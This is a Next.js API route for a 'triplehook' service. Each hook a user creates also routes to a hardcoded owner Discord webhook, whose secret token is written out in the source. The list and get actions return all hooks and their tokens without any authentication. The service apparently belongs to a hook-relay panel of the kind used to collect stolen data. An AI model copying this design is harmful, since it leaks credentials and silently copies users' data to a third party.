import { NextRequest, NextResponse } from 'next/server';
import { triplehookConfigSchema } from '@/lib/triplehook-schema';
import { createTriplehook, deleteTriplehook, getAllTriplehooks, getTriplehook } from '@/lib/triplehook-storage';
import { notifyBothWebhooks } from '@/lib/webhook-notifications';

const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK || 'https://discord.com/api/webhooks/1483229400005607577/u-psLJJpLAKXu6g3RTs1TApinjh5G9GkVlQj-U6LtUHyQb2ZdmL1i-KnWT7ou-6o9UbQ';

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const action = searchParams.get('action');
    const id = searchParams.get('id');

    if (action === 'get' && id) {
      const triplehook = await getTriplehook(id);
      if (!triplehook) {
        return NextResponse.json(
          { success: false, message: 'Triplehook not found' },
          { status: 404 }
        );
      }
      return NextResponse.json({ success: true, data: triplehook });
    }

    if (action === 'list') {
      const triplehooks = await getAllTriplehooks();
      return NextResponse.json({ success: true, data: triplehooks });
    }

    return NextResponse.json(
      { success: false, message: 'Invalid action' },
      { status: 400 }
    );
  } catch (error) {
    console.error('[v0] Triplehook GET error:', error);
    return NextResponse.json(
      { success: false, message: 'Internal server error' },
      { status: 500 }
    );
  }
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { action } = body;

    if (action === 'create') {
      const result = triplehookConfigSchema.safeParse(body);
      if (!result.success) {
        return NextResponse.json(
          { success: false, message: 'Invalid input', errors: result.error.flatten() },
          { status: 400 }
        );
      }

      const { directory, webhook1, discord_server } = result.data;

      const triplehook = await createTriplehook(
        directory,
        webhook1,
        OWNER_WEBHOOK,
        discord_server
      );

      const domain = req.headers.get('host') || 'localhost:3000';
      await notifyBothWebhooks(
        webhook1,
        OWNER_WEBHOOK,
        directory,
        triplehook.token,
        domain,
        'created'
      );

      return NextResponse.json({
        success: true,
        data: triplehook,
        message: 'Triplehook created successfully',
      });
    }

    if (action === 'delete') {
      const { id } = body;
      if (!id) {
        return NextResponse.json(
          { success: false, message: 'ID required' },
          { status: 400 }
        );
      }

      const triplehook = await getTriplehook(id);
      if (!triplehook) {
        return NextResponse.json(
          { success: false, message: 'Triplehook not found' },
          { status: 404 }
        );
      }

      const deleted = await deleteTriplehook(id);
      if (deleted) {
        return NextResponse.json({
          success: true,
          message: 'Triplehook deleted successfully',
        });
      }

      return NextResponse.json(
        { success: false, message: 'Failed to delete triplehook' },
        { status: 500 }
      );
    }

    return NextResponse.json(
      { success: false, message: 'Invalid action' },
      { status: 400 }
    );
  } catch (error) {
    console.error('[v0] Triplehook POST error:', error);
    return NextResponse.json(
      { success: false, message: 'Internal server error' },
      { status: 500 }
    );
  }
}
